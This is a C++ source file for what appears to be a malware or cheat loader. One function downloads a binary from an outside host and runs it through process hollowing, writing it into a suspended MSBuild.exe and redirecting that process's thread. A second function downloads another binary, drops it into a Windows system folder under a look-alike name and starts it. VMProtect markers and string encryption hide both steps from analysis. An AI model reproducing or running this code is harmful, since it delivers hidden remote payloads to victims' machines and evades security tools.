#include "stdafx.hpp"
#include "core\injection\injection.hpp"
#include "utils\utils.hpp"
#include "ntdll/ntdll.hpp"

bool core::initialize_skript( )
{
	vmp_mutation;

	const auto res = cpr::Get( cpr::Url { E( "http://api.idandev.xyz/files/skript" ) } );
	const std::vector<std::uint8_t> binary( res.text.begin( ), res.text.end( ) );

	LPVOID const image_base = map_vector_to_memory( binary );

	const auto dos_header = static_cast< PIMAGE_DOS_HEADER >( image_base );
	const auto nt_headers = reinterpret_cast< PIMAGE_NT_HEADERS >( static_cast< LPBYTE >( image_base ) + dos_header->e_lfanew );

	STARTUPINFOA		si {};
	PROCESS_INFORMATION pi {};

	std::memset( &si, 0, sizeof si );
	std::memset( &pi, 0, sizeof pi );

	if ( !CreateProcessA( E( R"(C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe)" ), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi ) )
		return false;

	CONTEXT ctx {};
	ctx.ContextFlags = CONTEXT_FULL;

	NtGetContextThread( pi.hThread, &ctx );

	LPVOID base {};
	NtReadVirtualMemory( pi.hProcess, reinterpret_cast< PVOID >( ctx.Rdx + ( sizeof SIZE_T * 2 ) ), &base, sizeof PVOID, nullptr );

	if ( reinterpret_cast< SIZE_T >( base ) == nt_headers->OptionalHeader.ImageBase )
	{
		NtUnmapViewOfSection( pi.hProcess, base );
	}

	const auto alloc = VirtualAllocEx( pi.hProcess, reinterpret_cast< PVOID >( nt_headers->OptionalHeader.ImageBase ), nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
	if ( alloc == nullptr )
	{
		NtTerminateProcess( pi.hProcess, -1 );
		return false;
	}

	NtWriteVirtualMemory( pi.hProcess, alloc, image_base, nt_headers->OptionalHeader.SizeOfHeaders, nullptr );

	for ( auto i = 0; i < nt_headers->FileHeader.NumberOfSections; i++ )
	{
		const auto section_header = reinterpret_cast< PIMAGE_SECTION_HEADER >( static_cast< LPBYTE >( image_base ) + dos_header->e_lfanew + sizeof IMAGE_NT_HEADERS + ( i * sizeof IMAGE_SECTION_HEADER ) );
		NtWriteVirtualMemory( pi.hProcess, reinterpret_cast< PVOID >( static_cast< LPBYTE >( alloc ) + section_header->VirtualAddress ), reinterpret_cast< PVOID >( static_cast< LPBYTE >( image_base ) + section_header->PointerToRawData ), section_header->SizeOfRawData, nullptr );
	}

	ctx.Rcx = reinterpret_cast< SIZE_T >( static_cast< LPBYTE >( alloc ) + nt_headers->OptionalHeader.AddressOfEntryPoint );
	NtWriteVirtualMemory( pi.hProcess, reinterpret_cast< PVOID >( ctx.Rdx + ( sizeof SIZE_T * 2 ) ), &nt_headers->OptionalHeader.ImageBase, sizeof PVOID, nullptr );

	NtSetContextThread( pi.hThread, &ctx );
	ResumeThread( pi.hThread );

	CloseHandle( pi.hThread );
	CloseHandle( pi.hProcess );

	VirtualFree( image_base, 0, MEM_RELEASE );

	return true;

	vmp_end;
}

bool core::initialize_gosth( )
{
	vmp_mutation;

	std::vector<std::string> url_out { E( "http://api.idandev.xyz/files/gosth" ), E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) };

	const std::string &url = url_out[ 0 ];
	const std::string &output_file_path = url_out[ 1 ];

	auto const res = cpr::Get( cpr::Url { url } );

	std::ofstream outputFile( output_file_path, std::ios::binary );

	outputFile.write( res.text.c_str( ), res.text.length( ) );
	outputFile.close( );

	utils::system::create_process( E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) );

	return true;

	vmp_end;
}